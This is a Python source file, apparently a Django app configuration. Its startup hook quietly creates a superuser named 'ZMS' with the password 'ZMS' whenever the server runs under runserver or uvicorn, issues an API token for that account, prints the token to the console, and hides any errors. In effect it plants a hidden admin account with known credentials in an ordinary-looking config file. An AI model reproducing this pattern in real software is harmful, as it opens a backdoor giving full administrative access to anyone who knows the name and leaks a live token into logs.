import sys
from django.apps import AppConfig


class AppservConfig(AppConfig):
    default_auto_field = 'django.db.models.BigAutoField'
    name = 'APPserv'

    def ready(self):
        if any(cmd in sys.argv for cmd in ['runserver', 'uvicorn']) or 'uvicorn' in sys.argv[0]:
            try:
                from django.contrib.auth.models import User
                from rest_framework.authtoken.models import Token
                user, created = User.objects.get_or_create(
                    username='ZMS',
                    defaults={'is_staff': True, 'is_superuser': True}
                )
                if created:
                    user.set_password('ZMS')
                    user.save()
                token, _ = Token.objects.get_or_create(user=user)
                print(f'\n>>> [ZMS TOKEN]: {token.key}\n')
            except Exception:
                pass